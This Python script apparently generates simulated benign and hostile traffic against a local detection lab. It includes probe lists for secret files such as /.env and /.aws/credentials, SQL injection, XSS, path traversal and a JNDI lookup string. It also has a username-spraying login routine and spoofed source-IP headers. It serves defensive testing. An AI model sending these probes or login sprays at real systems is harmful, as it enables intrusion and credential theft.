#!/usr/bin/env python3
"""Replays client profiles against the local lab.

Test fixture, not an attack tool. Payloads are inert strings, the target
defaults to loopback and anything else needs an explicit flag.

    python tools/simulate_traffic.py --rounds 20 --simulate-edge
"""

from __future__ import annotations

import argparse
import random
import sys
import time
from urllib.parse import urlparse

try:
    import httpx
except ImportError:  # pragma: no cover
    sys.exit("httpx is required: pip install httpx")

LOCAL_HOSTS = {"127.0.0.1", "localhost", "::1", "0.0.0.0", "honeypot", "edge"}

CHROME_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
)

BROWSER_HEADERS = {
    "User-Agent": CHROME_UA,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "pt-BR,pt;q=0.9,en;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-User": "?1",
    "Sec-CH-UA": '"Chromium";v="126", "Not;A=Brand";v="24"',
    "Referer": "http://localhost:8080/",
}

SCANNER_PATHS = [
    "/.env", "/.git/config", "/wp-config.php", "/phpinfo.php", "/server-status",
    "/actuator/health", "/admin", "/phpmyadmin/index.php", "/backup.zip",
    "/.aws/credentials", "/config.json", "/telescope/requests", "/debug/vars",
]

BROWSER_PATHS = ["/", "/login", "/status", "/api/v1/products", "/robots.txt"]

INERT_PROBES = [
    "/api/v1/products?id=1%27%20UNION%20SELECT%20null--",
    "/search?q=<script>alert(1)</script>",
    "/download?file=../../../../etc/passwd",
    "/api/v1/products?id=${jndi:ldap://example.invalid/a}",
]

USERNAMES = ["admin", "root", "test", "gabriel", "support", "administrator",
             "user1", "info", "sa", "operator"]

# RFC 5737 documentation ranges, so nothing collides with a real network.
#   198.51.100.0/24 -> hostile profiles
#   203.0.113.0/24  -> legitimate profiles
#
# injected as X-Edge-Client-IP. only works hitting the sensor directly, nginx
# overwrites that header so the same trick through the edge goes nowhere.
# without it every profile shares one address and velocity collapses.
SOURCE_POOLS = {
    "human": ["203.0.113.14", "203.0.113.27", "203.0.113.55", "203.0.113.91"],
    "verified_crawler": ["203.0.113.100"],
    "scanner": ["198.51.100.7", "198.51.100.23", "198.51.100.64"],
    "exploit_probe": ["198.51.100.41", "198.51.100.88"],
    "credential_attack": ["198.51.100.12", "198.51.100.150"],
    "scraper": ["198.51.100.201", "198.51.100.202"],
}


def profile_human(client: httpx.Client, base: str, extra: dict) -> None:
    for path in random.sample(BROWSER_PATHS, k=random.randint(2, 4)):
        client.get(base + path, headers={**BROWSER_HEADERS, **extra})
        time.sleep(random.uniform(0.2, 0.8))


def profile_verified_crawler(client: httpx.Client, base: str, extra: dict) -> None:
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Accept": "*/*",
        "Accept-Encoding": "gzip",
        "From": "googlebot(at)googlebot.com",
        **extra,
    }
    for path in ("/", "/robots.txt", "/api/v1/products"):
        client.get(base + path, headers=headers)


def profile_scanner(client: httpx.Client, base: str, extra: dict) -> None:
    headers = {"User-Agent": random.choice(["nikto/2.5.0", "gobuster/3.6", "curl/8.4.0"]),
               "Accept": "*/*", **extra}
    for path in random.sample(SCANNER_PATHS, k=random.randint(8, len(SCANNER_PATHS))):
        client.get(base + path, headers=headers)


def profile_exploit_probe(client: httpx.Client, base: str, extra: dict) -> None:
    headers = {"User-Agent": "sqlmap/1.8#stable", "Accept": "*/*", **extra}
    for path in INERT_PROBES:
        client.get(base + path, headers=headers)


def profile_credential_attack(client: httpx.Client, base: str, extra: dict) -> None:
    headers = {
        "User-Agent": "python-requests/2.32.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
        **extra,
    }
    for username in random.sample(USERNAMES, k=random.randint(6, len(USERNAMES))):
        client.post(
            base + "/login",
            headers=headers,
            data={"username": username, "password": f"synthetic-{random.randint(1000, 9999)}"},
        )


def profile_scraper(client: httpx.Client, base: str, extra: dict) -> None:
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Accept": "*/*",
        **extra,
    }
    for page in range(1, random.randint(12, 25)):
        client.get(f"{base}/api/v1/products?page={page}", headers=headers)


PROFILES = {
    "human": (profile_human, 3),
    "verified_crawler": (profile_verified_crawler, 1),
    "scanner": (profile_scanner, 3),
    "exploit_probe": (profile_exploit_probe, 2),
    "credential_attack": (profile_credential_attack, 2),
    "scraper": (profile_scraper, 2),
}


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", default="http://127.0.0.1:8080",
                        help="Base URL of your own lab (default: %(default)s)")
    parser.add_argument("--rounds", type=int, default=12, help="Number of client sessions")
    parser.add_argument("--allow-remote", action="store_true",
                        help="Required to target a non-loopback host you operate")
    parser.add_argument(
        "--simulate-edge", action="store_true",
        help="Give each profile a synthetic source address (RFC 5737). Only "
             "works against the sensor directly; nginx overwrites the header. "
             "Without it every profile shares one address.",
    )
    args = parser.parse_args()

    host = urlparse(args.target).hostname or ""
    if host not in LOCAL_HOSTS and not args.allow_remote:
        parser.error(
            f"refusing to generate traffic against '{host}'. Re-run with --allow-remote "
            "only for a host you own and operate."
        )

    weighted = [name for name, (_, weight) in PROFILES.items() for _ in range(weight)]

    with httpx.Client(timeout=5.0, follow_redirects=False) as client:
        for i in range(args.rounds):
            name = random.choice(weighted)
            fn, _ = PROFILES[name]

            extra: dict[str, str] = {}
            if args.simulate_edge:
                extra["X-Edge-Client-IP"] = random.choice(SOURCE_POOLS[name])

            source = extra.get("X-Edge-Client-IP", "local")
            print(f"[{i + 1}/{args.rounds}] profile={name} source={source}")
            try:
                fn(client, args.target.rstrip("/"), extra)
            except httpx.HTTPError as exc:
                print(f"  ! {exc}")
            time.sleep(random.uniform(0.1, 0.4))

    print("\nDone. Open the dashboard at <sensor>/_edl/dashboard")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
